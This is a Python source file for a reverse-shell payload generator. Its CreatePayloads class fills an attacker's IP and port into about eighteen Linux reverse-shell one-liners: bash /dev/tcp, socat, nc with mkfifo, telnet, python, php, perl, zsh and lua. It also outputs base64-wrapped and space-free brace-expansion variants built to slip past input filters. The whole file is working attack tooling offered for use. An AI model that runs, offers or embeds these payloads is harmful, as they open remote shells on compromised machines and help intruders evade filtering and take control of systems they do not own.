from rich.pretty import pprint
import base64


class CreatePayloads:
    def __init__(self, ip, port, windows=False):
        self.ip = ip
        self.port = port
        self.use_windows = windows

    def Linux(self):
        payloads = ['0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
                    '/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
                    'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
                    'sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
                    "socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane",
                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' ',
                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' ',
                    'mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol',
                    'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
                    'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF',
                    'php -r \'$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\'',
                    'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
                    'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
                    "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
                    'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');" ']

        """Replace Setup ip and port in payloads"""
        ready_payloads = []
        for payload in payloads:
            payload = payload.replace("{ip}", self.ip)
            payload = payload.replace("{port}", str(self.port))
            ready_payloads.append(payload)

        """No Space"""
        no_space = []
        for payload in ready_payloads:
            payload = payload.encode("utf-8")
            encoded = base64.b64encode(payload).decode('utf-8')
            forged = "/bin/bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
            no_space.append(forged)

        """Encode Base64"""
        base64_payloads = []
        for payload in ready_payloads:
            payload = payload.encode("utf-8")
            encoded = base64.b64encode(payload).decode('utf-8')
            forged = "/bin/bash -c 'echo " + f"{encoded}" + "|base64 -d|bash -i'"
            base64_payloads.append(forged)

        # pprint(base64_payloads)
        # pprint(no_space)
        return ready_payloads + base64_payloads + no_space

